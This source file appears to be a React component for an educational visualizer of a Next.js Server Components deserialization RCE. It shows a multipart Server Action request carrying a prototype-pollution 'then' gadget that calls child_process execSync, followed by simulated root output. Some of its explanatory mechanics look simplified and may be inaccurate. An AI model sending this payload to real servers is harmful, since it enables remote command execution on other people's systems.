
import React from 'react';
import { AnimationStep } from '../types';
import { Laptop, Server, Database, ArrowDown, ArrowRight, Terminal, Code, Zap, FileJson, BookOpen, Layers, AlertTriangle } from 'lucide-react';

interface NextJsRceVisualizerProps {
  step: AnimationStep;
}

export const NextJsRceVisualizer: React.FC<NextJsRceVisualizerProps> = ({ step }) => {
  const currentState = step.nextRceStep || 'craft_payload';
  const isBackground = step.id === 0; // Assuming step ID 0 is background info
  
  // Animation Triggers
  const showRequest = ['send_poison', 'cache_write', 'trigger_render', 'cache_hit', 'deserialization', 'execution'].includes(currentState);
  const showCacheWrite = ['cache_write', 'trigger_render', 'cache_hit', 'deserialization', 'execution'].includes(currentState);
  const showTrigger = ['trigger_render', 'cache_hit', 'deserialization', 'execution'].includes(currentState);
  const showHit = ['cache_hit', 'deserialization', 'execution'].includes(currentState);
  const showDeser = ['deserialization', 'execution'].includes(currentState);
  const showExecution = currentState === 'execution';

  if (isBackground) {
      return (
          <div className="flex flex-col gap-6 w-full max-w-4xl mx-auto p-4 animate-in fade-in duration-500">
              <div className="flex items-center gap-2 text-blue-400 font-bold uppercase tracking-wider text-sm border-b border-slate-700 pb-2">
                  <BookOpen size={18} /> Background Knowledge: Flight Protocol
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                  {/* Left: Concept */}
                  <div className="flex flex-col gap-4 text-sm text-slate-300">
                      <p>
                          Next.js (App Router) uses <strong>React Server Components (RSC)</strong>. To send component trees from server to client, React serializes them into a text format called <strong>"Flight"</strong>.
                      </p>
                      <p>
                          Flight can serialize complex data structures:
                      </p>
                      <ul className="list-disc list-inside space-y-1 pl-2 text-slate-400">
                          <li>JSON Objects & Arrays</li>
                          <li>Promises (as <code>$@...</code> references)</li>
                          <li>Component Elements (Lazy loaded)</li>
                      </ul>
                      <div className="bg-yellow-900/20 border border-yellow-500/30 p-3 rounded text-yellow-200 text-xs">
                          <strong>The Vulnerability:</strong> The deserializer is powerful. If an attacker can inject a payload that defines <code>__proto__</code> or mimics a Promise (a "thenable"), React might execute it during hydration.
                      </div>
                  </div>

                  {/* Right: Visualization */}
                  <div className="bg-[#1e1e1e] p-4 rounded-xl border border-slate-600 flex flex-col gap-4 shadow-lg">
                      <div className="flex justify-between items-center text-xs font-bold text-slate-500">
                          <span>SERVER</span>
                          <ArrowRight size={16} />
                          <span>CLIENT</span>
                      </div>
                      <div className="bg-black p-3 rounded font-mono text-xs text-green-400 border border-slate-700">
                          1:I["./app/page.js", ...]<br/>
                          2:{"{"}"name": "Alice", "data": "$@1"{"}"}<br/>
                          3:{"{"}"then": "$1:__proto__:then"{"}"}
                      </div>
                      <div className="text-center text-[10px] text-slate-500">
                          (Flight Data Stream)
                      </div>
                  </div>
              </div>
          </div>
      );
  }

  return (
    <div className="flex flex-col gap-6 w-full max-w-5xl mx-auto p-4">
        
        {/* 1. ATTACKER & REQUEST */}
        <div className="relative flex flex-col gap-2">
            <div className="flex items-center gap-2 text-red-400 font-bold uppercase tracking-wider text-sm">
                <Laptop size={18} /> Attacker Request
            </div>
            
            <div className="w-full bg-[#1e1e1e] border border-slate-700 rounded-xl p-4 shadow-lg font-mono text-xs relative overflow-hidden">
                <div className="flex gap-4 mb-2 border-b border-slate-700 pb-2">
                    <span className="text-yellow-400 font-bold">POST /action HTTP/1.1</span>
                    <span className="text-slate-400">Host: vuln-app.com</span>
                </div>
                
                <div className="text-blue-300">
                    Next-Action: 82138e1...<br/>
                    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX
                </div>
                
                <div className="mt-2 text-slate-300 pl-2 border-l-2 border-slate-600">
                    <span className="text-slate-500">------WebKitFormBoundaryX</span><br/>
                    Content-Disposition: form-data; name="0"<br/>
                    <br/>
                    <span className="text-red-400 break-all">
                       {`{"then":"$1:__proto__:then", "value":"{\"then\":\"$B1337\"}", "_response":{"_prefix":"process.mainModule.require('child_process').execSync('id');", ...}}`}
                    </span><br/>
                    <span className="text-slate-500">------WebKitFormBoundaryX</span><br/>
                    Content-Disposition: form-data; name="1"<br/>
                    <br/>
                    "$@0"<br/>
                    <span className="text-slate-500">------WebKitFormBoundaryX--</span>
                </div>

                {showRequest && (
                    <div className="absolute right-6 top-1/2 -translate-y-1/2">
                        <ArrowDown size={32} className="text-red-500 animate-bounce" />
                    </div>
                )}
            </div>
        </div>

        {/* 2. SERVER INTERNALS */}
        <div className="relative flex flex-col gap-2">
            <div className="flex items-center gap-2 text-white font-bold uppercase tracking-wider text-sm">
                <Server size={18} /> Next.js Server Processing
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 w-full">
                
                {/* A. CACHE LAYER */}
                <div className={`
                    p-4 rounded-xl border-2 transition-all duration-500 flex flex-col gap-2 relative
                    ${showCacheWrite ? 'bg-yellow-900/10 border-yellow-500/50' : 'bg-slate-900 border-slate-700'}
                `}>
                    <div className="flex items-center gap-2 text-xs font-bold text-slate-300">
                        <Database size={14} className="text-yellow-500" />
                        unstable_cache (ISR)
                    </div>
                    
                    <div className="bg-black/40 flex-1 rounded border border-slate-700 p-2 font-mono text-[10px] text-slate-400 overflow-hidden relative">
                        {showCacheWrite ? (
                            <div className="animate-in zoom-in duration-300">
                                <div className="text-slate-500 border-b border-slate-800 mb-1">KEY: user_input_1</div>
                                <div className="text-red-300 leading-tight break-all">
                                    [POISONED ENTRY]<br/>
                                    Payload stored...
                                </div>
                            </div>
                        ) : (
                            <span className="text-slate-600 italic">Empty</span>
                        )}
                        
                        {showHit && (
                            <div className="absolute inset-0 bg-yellow-500/10 animate-pulse border-2 border-yellow-500/50 rounded pointer-events-none"></div>
                        )}
                    </div>
                    {showTrigger && !showHit && (
                        <div className="absolute -top-3 right-4 bg-purple-600 text-white text-[10px] px-2 py-0.5 rounded animate-pulse">
                            Request 2: GET /page
                        </div>
                    )}
                </div>

                {/* B. DESERIALIZATION */}
                <div className={`
                    p-4 rounded-xl border-2 transition-all duration-500 flex flex-col gap-2
                    ${showDeser ? 'bg-purple-900/10 border-purple-500/50' : 'bg-slate-900 border-slate-700'}
                `}>
                    <div className="flex items-center gap-2 text-xs font-bold text-slate-300">
                        <Layers size={14} className="text-purple-500" />
                        React.deserialize()
                    </div>

                    <div className="bg-black/40 flex-1 rounded border border-slate-700 p-2 font-mono text-[10px] relative">
                        <div className="text-slate-500 mb-1">Object Reconstruction</div>
                        {showDeser ? (
                            <div className="flex flex-col gap-1">
                                <div className="text-green-300">Obj = {"{"} ... {"}"}</div>
                                <div className="flex items-center gap-1 text-red-400 bg-red-900/20 px-1 rounded animate-pulse">
                                    <AlertTriangle size={10} />
                                    Property: "then"
                                </div>
                                <div className="text-slate-400 italic">
                                    React sees "then", treats as Promise...
                                </div>
                            </div>
                        ) : (
                            <span className="text-slate-600 italic">Waiting...</span>
                        )}
                    </div>
                </div>

                {/* C. EXECUTION */}
                <div className={`
                    p-4 rounded-xl border-2 transition-all duration-500 flex flex-col gap-2 relative overflow-hidden
                    ${showExecution ? 'bg-red-900/20 border-red-500 shadow-[0_0_20px_rgba(220,38,38,0.3)]' : 'bg-slate-900 border-slate-700'}
                `}>
                    <div className="flex items-center gap-2 text-xs font-bold text-slate-300">
                        <Zap size={14} className={showExecution ? "text-red-500" : "text-slate-600"} />
                        Execution Sink
                    </div>

                    <div className="bg-black flex-1 rounded border border-slate-700 p-2 font-mono text-[10px] flex flex-col justify-end">
                        {showExecution ? (
                            <div className="text-green-400 animate-bounce">
                                $ id<br/>
                                <span className="text-white">uid=0(root) gid=0(root)</span>
                            </div>
                        ) : (
                            <span className="text-slate-600">Terminal Idle</span>
                        )}
                    </div>
                </div>

            </div>
        </div>

        {/* FLOW ARROWS (Desktop) */}
        <div className="hidden md:flex justify-around -mt-4 text-slate-600 px-12">
             <ArrowDown size={20} className={showCacheWrite ? 'text-yellow-500 animate-pulse' : ''} />
             <ArrowRight size={20} className={showDeser ? 'text-purple-500 animate-pulse' : ''} />
             <ArrowRight size={20} className={showExecution ? 'text-red-500 animate-pulse' : ''} />
        </div>

        {/* Technical Footer */}
        <div className="bg-slate-900 border border-slate-700 rounded-xl p-4 flex gap-4 items-start mt-2">
            <div className="bg-slate-800 p-2 rounded-full mt-1">
                <FileJson className="text-blue-400" size={20} />
            </div>
            <div>
                <h3 className="text-sm font-bold text-slate-200 mb-1">Technical Deep Dive</h3>
                <p className="text-xs text-slate-400 leading-relaxed">
                    {currentState === 'craft_payload' && "The payload uses a prototype pollution gadget (`__proto__:then`). This tells React's deserializer to treat the object as a Promise."}
                    {currentState === 'send_poison' && "The multipart request splits the payload into references. `$@0` refers to the first part, constructing a recursive structure."}
                    {currentState === 'cache_write' && "Crucially, `unstable_cache` saves this serialized flight data. The cache entry is now a 'landmine'."}
                    {currentState === 'trigger_render' && "When the page is requested again, Next.js fetches the poisoned entry to speed up rendering."}
                    {currentState === 'deserialization' && "React hydrates the object. It sees the `then` property and attempts to resolve the 'Promise', invoking the gadget."}
                    {currentState === 'execution' && "The gadget triggers internal Node.js modules (`process.mainModule`), bypassing the sandbox and executing shell commands."}
                </p>
            </div>
        </div>

    </div>
  );
};
